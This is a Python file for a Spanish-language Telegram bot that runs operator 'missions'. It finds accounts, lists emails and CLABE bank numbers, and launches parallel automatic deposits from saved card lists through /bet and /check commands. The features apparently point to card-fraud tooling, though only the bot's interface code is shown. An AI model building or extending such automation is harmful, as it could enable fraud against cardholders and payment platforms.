            ]
        ),
    )

    last_edit_ts = [0.0]
    loop = asyncio.get_running_loop()

    def on_progress(status: str, extra: dict):
        now = time.time()

        if (
            status in ("completed", "cancelled", "failed")
            and mission_id in _gate_closed_missions
        ):
            return
        if status in ("completed", "cancelled", "failed"):
            _gate_closed_missions.discard(mission_id)

        st_text = _mission_status_text(status, extra)

        is_terminal = status in ("completed", "cancelled", "failed")
        is_priority = status in (
            "awaiting_confirmation",
            "completed",
            "cancelled",
            "failed",
            "preparing",
        )
        if not is_priority and (now - last_edit_ts[0] < 2.5):
            return
        last_edit_ts[0] = now

        if is_terminal:
            if status in ("cancelled", "failed"):
                text = (
                    f"{HEADER}\n\n"
                    f"🎯 <b>MISIÓN {mission_id}</b>\n\n"
                    f"• {st_text}\n\n"
                    f"🔄 <i>Proceso terminado. Puedes iniciar una nueva misión.</i>"
                )
                kb = InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                "🏠 Volver al inicio",
                                callback_data="btn_start_cancel",
                            )
                        ]
                    ]
                )
            else:
                text = (
                    f"{HEADER}\n\n"
                    f"🎯 <b>MISIÓN {mission_id}</b>\n\n"
                    f"• {st_text}\n\n"
                    f'🌐 <a href="{DASHBOARD_URL}/?match={mission_id}">Gestionar cuentas en el portal →</a>'
                )
                kb = InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                "🌐 Ver cuentas y gestionar →",
                                url=f"{DASHBOARD_URL}/?match={mission_id}",
                            )
                        ]
                    ]
                )
        else:
            # Habilitar link del portal en la UI de Telegram solo cuando la primera
            # cuenta se engancha (match, awaiting_confirmation, preparing, scheduling)
            show_dashboard = status in (
                "match",
                "awaiting_confirmation",
                "preparing",
                "scheduling",
            )
            if show_dashboard:
                text = (
                    f"{HEADER}\n\n"
                    f"⚡ <b>Rastreando y Procesando Cuentas</b>\n\n"
                    f"• {st_text}\n\n"
                    f'🌐 <a href="{DASHBOARD_URL}/?match={mission_id}">Ver en vivo →</a>\n'
                    f"🇲🇽 <i>Actualización automática…</i>"
                )
                kb = InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                "🌐 Ver en vivo →",
                                url=f"{DASHBOARD_URL}/?match={mission_id}",
                            )
                        ],
                        [
                            InlineKeyboardButton(
                                "🛑 Detener Misión",
                                callback_data=f"stop_mission_{mission_id}",
                            )
                        ],
                    ]
                )
            else:
                text = (
                    f"{HEADER}\n\n"
                    f"⚡ <b>Rastreando y Procesando Cuentas</b>\n\n"
                    f"• {st_text}\n\n"
                    f"🇲🇽 <i>Actualización automática…</i>"
                )
                kb = InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                "🛑 Detener Misión",
                                callback_data=f"stop_mission_{mission_id}",
                            )
                        ],
                    ]
                )

        async def _edit():
            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=kb)
            except Exception as ex:
                logger.warning(
                    f"[Bot] [Auto {mission_id}] edit_text falló (status={status}): {ex}"
                )
                if is_terminal:
                    try:
                        await context.bot.send_message(
                            chat_id=operator_id,
                            text=text,
                            parse_mode="HTML",
                            reply_markup=kb,
                        )
                    except Exception as ex2:
                        logger.warning(
                            f"[Bot] [Auto {mission_id}] fallback send_message también falló: {ex2}"
                        )

        asyncio.run_coroutine_threadsafe(_edit(), loop)

    async def confirm_gate(gate_info: dict) -> bool:
        m_id = gate_info["mission_id"]
        matches_list = gate_info["matches"]
        amt = gate_info.get("amount", 150.0)
        target = gate_info.get("target_count", 9)

        ev = asyncio.Event()
        _confirm_events[m_id] = (ev, {"decision": False})

        match_lines = []
        for m in matches_list:
            em = m.get("email", "")
            c_stp = m.get("clabe_stp")
            if c_stp:
                match_lines.append(
                    f"• <code>{em}</code>\n  CLABE STP: <code>{c_stp}</code>"
                )
            else:
                match_lines.append(f"• <code>{em}</code>")

        match_text_block = "\n".join(match_lines)
        confirm_text = (
            f"{HEADER}\n\n"
            f"⚡ <b>LLENADO AUTOMÁTICO DE CUENTA</b>\n\n"
            f"Cuentas encontradas: {len(matches_list)}\n"
            f"{match_text_block}\n\n"
            f'🌐 <a href="{DASHBOARD_URL}/?match={m_id}">Ver detalle en el portal →</a>\n\n'
            f"¿Iniciar llenado automático en paralelo?"
        )
        kb_confirm = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🚀 De Una / Iniciar Llenado",
                        callback_data=f"confirm_sched_{m_id}",
                    ),
                    InlineKeyboardButton(
                        "🛑 Cancelar", callback_data=f"stop_sched_{m_id}"
                    ),
                ],
                [
                    InlineKeyboardButton(
                        "🌐 Ver en vivo →", url=f"{DASHBOARD_URL}/?match={m_id}"
                    )
                ],
            ]
        )
        try:
            await status_msg.edit_text(
                confirm_text, parse_mode="HTML", reply_markup=kb_confirm
            )
        except Exception as ex:
            logger.warning(f"[Bot] No pude editar mensaje a confirm_gate: {ex}")

        try:
            await asyncio.wait_for(ev.wait(), timeout=600.0)
            res = _confirm_events.get(m_id, (None, {"decision": False}))[1].get(
                "decision", False
            )
        except asyncio.TimeoutError:
            res = False
            try:
                await status_msg.edit_text(
                    f"{HEADER}\n\nTiempo agotado. Operación cancelada.\n\n"
                    f"🌵 {get_random_greeting()}",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    "🏠 Volver al inicio",
                                    callback_data="btn_start_cancel",
                                )
                            ]
                        ]
                    ),
                )
            except Exception:
                pass
        finally:
            _confirm_events.pop(m_id, None)

        return res

    asyncio.create_task(
        run_auto_mission(
            mission_id,
            plan,
            user_info,
            on_progress=on_progress,
            confirm_gate=confirm_gate,
        )
    )
    return ConversationHandler.END


async def handle_bet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja la confirmación de /bet."""
    query = update.callback_query
    await query.answer()

    if query.data == "cancel_bet":
        context.user_data.pop("pending_bet_pipes", None)
        await query.edit_message_text("❌ Proceso /bet cancelado.")
        return ConversationHandler.END

    if query.data == "confirm_bet":
        valid_pipes = context.user_data.get("pending_bet_pipes", [])
        if not valid_pipes:
            await query.edit_message_text("❌ No hay tarjetas guardadas.")
            return ConversationHandler.END

        if _mission_sem.locked():
            await query.edit_message_text(
                "⚠️ Ya hay una misión de depósitos activa en el sistema. Intenta de nuevo en unos momentos."
            )
            return ConversationHandler.END

        operator_id = update.effective_user.id
        amount = 150.0
        target_count = 9

        plan = plan_auto_mission(DB_PATH, valid_pipes, amount, target_count)
        if not plan["feasible"]:
            await query.edit_message_text(
                f"❌ No fue posible armar el plan: {plan['reason']}"
            )
            return ConversationHandler.END

        from uuid import uuid4

        mission_id = str(uuid4())[:8]
        user_info = {
            "telegram_id": operator_id,
            "username": update.effective_user.username or "operator",
        }

        _persist_auto_mission(
            mission_id, operator_id, valid_pipes, amount, target_count, plan
        )

        # Mensaje base inicial de la misión — con link al portal vivo
        status_msg = await query.edit_message_text(
            f"{HEADER}\n\n"
            f"🎯 <b>MISIÓN {mission_id}</b>\n\n"
            f"• Estado: Rastreando cuentas aptas…\n"
            f'• 🌐 <a href="{DASHBOARD_URL}/?match={mission_id}">Ver en vivo en el portal →</a>\n\n'
            f"<i>El portal se actualiza solo, no necesitas recargar.</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🌐 Ver en vivo →",
                            url=f"{DASHBOARD_URL}/?match={mission_id}",
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            "🛑 Detener Misión",
                            callback_data=f"stop_mission_{mission_id}",
                        )
                    ],
                ]
            ),
        )

        last_edit_ts = [0.0]
        loop = asyncio.get_running_loop()

        def on_progress(status: str, extra: dict):
            now = time.time()

            # Guard idempotente (Área A §1.2): si el gate ya cerró el mensaje
            # con texto limpio (stop_sched_), no sobrescribir con el terminal leaky.
            if (
                status in ("completed", "cancelled", "failed")
                and mission_id in _gate_closed_missions
            ):
                return
            if status in ("completed", "cancelled", "failed"):
                # Robert 2026-08-05 (auditoría Claude Code): liberar el guard al
                # cerrar de verdad la misión — evita crecimiento indefinido del set
                # en un proceso de bot de larga vida.
                _gate_closed_missions.discard(mission_id)

            st_text = _mission_status_text(status, extra)

            # "preparing" (piso 45-60s antes de Fase 2) NO es terminal — la misión
            # sigue corriendo, el operador debe conservar el botón de detener.
            is_terminal = status in ("completed", "cancelled", "failed")
            is_priority = status in (
                "awaiting_confirmation",
                "completed",
                "cancelled",
                "failed",
                "preparing",
            )
            if not is_priority and (now - last_edit_ts[0] < 2.5):
                return
            last_edit_ts[0] = now

            if is_terminal:
                if status in ("cancelled", "failed"):
                    # Redirigir al inicio si el proceso falla o se cancela
                    text = (
                        f"{HEADER}\n\n"
                        f"🎯 <b>MISIÓN {mission_id}</b>\n\n"
                        f"• {st_text}\n\n"
                        f"🔄 <i>Proceso terminado. Puedes iniciar una nueva misión.</i>"
                    )
                    kb = InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    "🏠 Volver al inicio",
                                    callback_data="btn_start_cancel",
                                )
                            ]
                        ]
                    )
                else:
                    text = (
                        f"{HEADER}\n\n"
                        f"🎯 <b>MISIÓN {mission_id}</b>\n\n"
                        f"• {st_text}\n\n"
                        f'🌐 <a href="{DASHBOARD_URL}/?match={mission_id}">Gestionar cuentas en el portal →</a>'
                    )
                    kb = InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    "🌐 Ver cuentas y gestionar →",
                                    url=f"{DASHBOARD_URL}/?match={mission_id}",
                                )
                            ]
                        ]
                    )
            else:
                text = (
                    f"{HEADER}\n\n"
                    f"⚡ <b>Rastreando y Procesando Cuentas</b>\n\n"
                    f"• {st_text}\n\n"
                    f'🌐 <a href="{DASHBOARD_URL}/?match={mission_id}">Ver en vivo →</a>\n'
                    f"🇲🇽 <i>Actualización automática…</i>"
                )
                kb = InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                "🌐 Ver en vivo →",
                                url=f"{DASHBOARD_URL}/?match={mission_id}",
                            )
                        ],
                        [
                            InlineKeyboardButton(
                                "🛑 Detener Misión",
                                callback_data=f"stop_mission_{mission_id}",
                            )
                        ],
                    ]
                )

            async def _edit():
                try:
                    await status_msg.edit_text(text, parse_mode="HTML", reply_markup=kb)
                except Exception as ex:
                    logger.warning(
                        f"[Bot] [Auto {mission_id}] edit_text falló (status={status}): {ex}"
                    )
                    # Robert 2026-08-06: el edit silencioso dejaba misiones muertas
                    # mostrando el mensaje inicial ("Rastreando cuentas...") con el
                    # botón Detener Misión vivo para siempre — sin feedback ni error
                    # visible. En terminal (completed/cancelled/failed) mandamos un
                    # mensaje NUEVO como fallback en vez de morir en silencio.
                    if is_terminal:
                        try:
                            await context.bot.send_message(
                                chat_id=operator_id,
                                text=text,
                                parse_mode="HTML",
                                reply_markup=kb,
                            )
                        except Exception as ex2:
                            logger.warning(
                                f"[Bot] [Auto {mission_id}] fallback send_message también falló: {ex2}"
                            )

            asyncio.run_coroutine_threadsafe(_edit(), loop)

        async def confirm_gate(gate_info: dict) -> bool:
            m_id = gate_info["mission_id"]
            matches = gate_info["matches"]
            amt = gate_info.get("amount", 150.0)
            target = gate_info.get("target_count", 9)

            ev = asyncio.Event()
            _confirm_events[m_id] = (ev, {"decision": False})

            match_lines = []
            for m in matches:
                em = m.get("email", "")
                c_stp = m.get("clabe_stp")
                if c_stp:
                    match_lines.append(
                        f"• <code>{em}</code>\n  CLABE STP: <code>{c_stp}</code>"
                    )
                else:
                    match_lines.append(f"• <code>{em}</code>")

            match_text_block = "\n".join(match_lines)
            confirm_text = (
                f"{HEADER}\n\n"
                f"⚡ <b>LLENADO AUTOMÁTICO DE CUENTA</b>\n\n"
                f"Cuentas encontradas: {len(matches)}\n"
                f"{match_text_block}\n\n"
                f'🌐 <a href="{DASHBOARD_URL}/?match={m_id}">Ver detalle en el portal →</a>\n\n'
                f"¿Iniciar llenado automático en paralelo?"
            )
            kb_confirm = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🚀 De Una / Iniciar Llenado",
                            callback_data=f"confirm_sched_{m_id}",
                        ),
                        InlineKeyboardButton(
                            "🛑 Cancelar", callback_data=f"stop_sched_{m_id}"
                        ),
                    ],
                    [
                        InlineKeyboardButton(
                            "🌐 Ver en vivo →", url=f"{DASHBOARD_URL}/?match={m_id}"
                        )
                    ],
                ]
            )
            try:
                await status_msg.edit_text(
                    confirm_text, parse_mode="HTML", reply_markup=kb_confirm
                )
            except Exception as ex:
                logger.warning(f"[Bot] No pude editar mensaje a confirm_gate: {ex}")

            try:
                await asyncio.wait_for(ev.wait(), timeout=600.0)
                res = _confirm_events.get(m_id, (None, {"decision": False}))[1].get(
                    "decision", False
                )
            except asyncio.TimeoutError:
                res = False
                try:
                    await status_msg.edit_text(
                        f"{HEADER}\n\nTiempo agotado. Operación cancelada.\n\n"
                        f"🌵 {get_random_greeting()}",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(
                            [
                                [
                                    InlineKeyboardButton(
                                        "🏠 Volver al inicio",
                                        callback_data="btn_start_cancel",
                                    )
                                ]
                            ]
                        ),
                    )
                except Exception:
                    pass
            finally:
                _confirm_events.pop(m_id, None)

            return res

        asyncio.create_task(
            run_auto_mission(
                mission_id,
                plan,
                user_info,
                on_progress=on_progress,
                confirm_gate=confirm_gate,
            )
        )
        return ConversationHandler.END


async def handle_confirm_gate_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """Maneja las respuestas de confirmación explícita (confirm_sched / stop_sched)."""
    query = update.callback_query
    await query.answer()
    data = query.data or ""
    if data.startswith("confirm_sched_"):
        mission_id = data.replace("confirm_sched_", "").strip()
        item = _confirm_events.get(mission_id)
        if item:
            ev, state = item
            state["decision"] = True
            ev.set()
        await query.edit_message_text(
            f"✅ <b>Llenado automático iniciado.</b>\nProcesando depósitos en segundo plano...",
            parse_mode="HTML",
        )
    elif data.startswith("stop_sched_"):
        mission_id = data.replace("stop_sched_", "").strip()
        _gate_closed_missions.add(mission_id)
        item = _confirm_events.get(mission_id)
        if item:
            ev, state = item
            state["decision"] = False
            ev.set()
        await query.edit_message_text(
            f"🛑 <b>Llenado automático cancelado.</b>\nOperación finalizada.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🏠 Volver al inicio", callback_data="btn_start_cancel"
                        )
                    ]
                ]
            ),
        )


async def handle_stop_mission_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """Maneja el botón '🛑 Detener Misión' enviado en el mensaje de éxito."""
    query = update.callback_query
    await query.answer()
    if query.data.startswith("stop_mission_"):
        mission_id = query.data.replace("stop_mission_", "").strip()
        user_id = update.effective_user.id
        with db(write=True) as c:
            c.execute(
                "UPDATE auto_missions SET status='cancelled' WHERE mission_id=?",
                (mission_id,),
            )
        await query.edit_message_text(
            f"🛑 <b>Misión abortada por el operador.</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🏠 Volver al inicio", callback_data="btn_start_cancel"
                        )
                    ]
                ]
            ),
        )


async def setup_bot_commands(application):
    """Registra el menú nativo de comandos en la interfaz de Telegram.

    /adduser es operativo exclusivo del Superadmin: no se publica en el menú
    general (ni en /help) y solo se expone vía BotCommandScopeChat en el chat
    del Superadmin — nadie más lo ve ni sabe que existe.

    OJO: BotCommandScopeChat REEMPLAZA el scope default para ese chat (no se
    fusiona), así que el scope del SA debe llevar TODOS los comandos.
    """
    commands = [
        BotCommand("start", "🚀 Menú principal"),
        BotCommand("help", "📖 Manual operativo"),
        BotCommand("cancel", "🛑 Cancelar proceso"),
    ]
    try:
        await application.bot.set_my_commands(commands)
        await application.bot.set_my_commands(
            commands + [BotCommand("adduser", "👤 Agregar usuario")],
            scope=BotCommandScopeChat(chat_id=SUPERADMIN_ID),
        )
        logger.info(
            "[Bot] Menú nativo de comandos en Telegram configurado exitosamente."
        )
    except Exception as ex:
        logger.warning(f"[Bot] No se pudo registrar menú nativo de comandos: {ex}")

    # Enviar mensaje startup exclusivo al SuperAdmin (Robert)
    startup_msg = (
        f"{HEADER}\n\n⚡ <b>Telegram Bot Online</b>\n\nSistema listo. A darle..."
    )
    try:
        await application.bot.send_message(
            chat_id=SUPERADMIN_ID, text=startup_msg, parse_mode="HTML"
        )
        logger.info(
            f"[Bot] Notificación de arranque enviada exclusivamente a SuperAdmin ({SUPERADMIN_ID})."
        )
    except Exception as ex:
        logger.warning(
            f"[Bot] No se pudo enviar notificación de arranque a SuperAdmin: {ex}"
        )


async def global_error_handler(
    update: object, context: ContextTypes.DEFAULT_TYPE
) -> None:
    """Manejo centralizado de errores para evitar unhandled exceptions en el bot loop."""
    err = context.error
    if isinstance(err, (NetworkError, TimedOut)):
        logger.warning(f"[Bot Network] Error temporal de conexión: {err}")
    elif isinstance(err, Conflict):
        logger.error(
            f"[Bot Conflict] Conflicto de instancia: otro bot está usando el token {MOCK_BOT_TOKEN[:10]}..."
        )
    else:
        logger.error(
            f"[Bot Error] Excepción no controlada en handler: {err}", exc_info=err
        )


def build_app():
    """Construye la aplicación python-telegram-bot con resiliencia de red."""
    req_config = HTTPXRequest(
        connect_timeout=15.0,
        read_timeout=30.0,
        write_timeout=15.0,
        pool_timeout=15.0,
        connection_pool_size=10,
    )
    app = (
        ApplicationBuilder()
        .token(MOCK_BOT_TOKEN)
        .request(req_config)
        .post_init(setup_bot_commands)
        .build()
    )

    app.add_error_handler(global_error_handler)

    # Handlers directos
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("botmex", botmex_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))

    # Handler callback para botones standalone del /start (help y cancel)
    app.add_handler(
        CallbackQueryHandler(
            start_buttons_callback, pattern="^(btn_start_help|btn_start_cancel)$"
        )
    )

    # Handler callback independiente para detener misión iniciada
    app.add_handler(
        CallbackQueryHandler(handle_stop_mission_callback, pattern="^stop_mission_")
    )
    app.add_handler(
        CallbackQueryHandler(
            handle_confirm_gate_callback, pattern="^(confirm_sched_|stop_sched_)"
        )
    )

    # ConversationHandler para /check
    check_handler = ConversationHandler(
        entry_points=[
            CommandHandler("check", check_cmd),
            CallbackQueryHandler(start_buttons_callback, pattern="^btn_start_check$"),
        ],
        states={
            WAIT_CHECK_CONFIRM: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_check_input),
                MessageHandler(filters.Document.ALL, process_check_input),
                CallbackQueryHandler(
                    handle_check_callback, pattern="^(confirm_check|cancel_check)$"
                ),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    app.add_handler(check_handler)

    # ConversationHandler para /adduser
    adduser_handler = ConversationHandler(
        entry_points=[
            CommandHandler("adduser", adduser_cmd),
            CommandHandler("agregar_usuario", adduser_cmd),
        ],
        states={
            WAIT_ADDUSER_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_adduser_input),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    app.add_handler(adduser_handler)

    # ConversationHandler para /bet
    bet_handler = ConversationHandler(
        entry_points=[
            CommandHandler("bet", bet_cmd),
            CallbackQueryHandler(start_buttons_callback, pattern="^btn_start_bet$"),
        ],
        states={
            WAIT_BET_CONFIRM: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_bet_input),
                CallbackQueryHandler(
                    handle_bet_callback, pattern="^(confirm_bet|cancel_bet)$"
                ),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
    )
    app.add_handler(bet_handler)

    return app


if __name__ == "__main__":
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    print(f"[BOT MOCK] Iniciando Telegram Bot Mock con Token: {MOCK_BOT_TOKEN[:10]}...")
    print(f"[BOT MOCK] Base de Datos configurada: {DB_PATH}")
    app = build_app()
    app.run_polling(bootstrap_retries=-1, poll_interval=1.0)
